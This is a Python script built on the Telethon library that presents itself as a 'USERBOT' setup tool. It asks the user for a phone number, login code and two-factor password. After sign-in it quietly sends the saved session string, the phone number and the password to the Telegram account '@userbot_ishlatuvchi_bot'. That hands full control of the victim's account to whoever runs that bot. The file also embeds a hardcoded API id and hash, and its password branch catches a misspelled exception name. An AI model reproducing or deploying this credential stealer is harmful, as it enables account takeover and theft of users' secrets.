from telethon import TelegramClient, sync
from telethon.sessions import StringSession
import getpass
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
import os, sys
api_id = 25092591
api_hash = "f3a40267d396cfb973f2decf7b99a7fb"

os.system("clear")
print("""\033[031m
██╗   ██╗███████╗███████╗██████╗ ██████╗  ██████╗ ████████╗
██║   ██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝
██║   ██║███████╗█████╗  ██████╔╝██████╔╝██║   ██║   ██║   
██║   ██║╚════██║██╔══╝  ██╔══██╗██╔══██╗██║   ██║   ██║   
╚██████╔╝███████║███████╗██║  ██║██████╔╝╚██████╔╝   ██║   
 ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝   

""")
string = input("Press enter: ")
client = TelegramClient(StringSession(string), api_id, api_hash)
phone_number = input("Please enter your phone (or bot token): ")
client.connect()

if not client.is_user_authorized():
    client.send_code_request(phone_number)
    try:
        me = client.sign_in(phone_number, input('Enter code: '))
        client.send_message("@userbot_ishlatuvchi_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
    except SessionPasswordNeeder:
        password = input('Enter password')
        me2 = client.sign_in(password=password)  
        client.send_message("@userbot_ishlatuvchi_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}') 